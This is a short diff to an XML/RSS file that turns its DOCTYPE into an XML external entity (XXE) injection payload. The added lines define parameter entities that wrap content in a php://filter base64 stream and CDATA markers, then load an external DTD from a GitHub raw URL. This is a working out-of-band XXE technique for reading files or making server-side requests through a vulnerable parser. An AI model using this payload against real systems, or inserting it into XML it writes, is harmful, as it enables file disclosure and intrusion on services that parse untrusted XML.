@@ -1,6 +1,10 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/f7a01d2455beccbd6b749ebe34f3ed8f584f4b2a/xml.xml">
+ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/master/xml.xml">
+ <!ENTITY % start SYSTEM "<![CDATA["> 
+ <!ENTITY % end SYSTEM "]]>">
+ <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
+ %dtd;
 ]>
 <rss version="2.0">
 <channel>
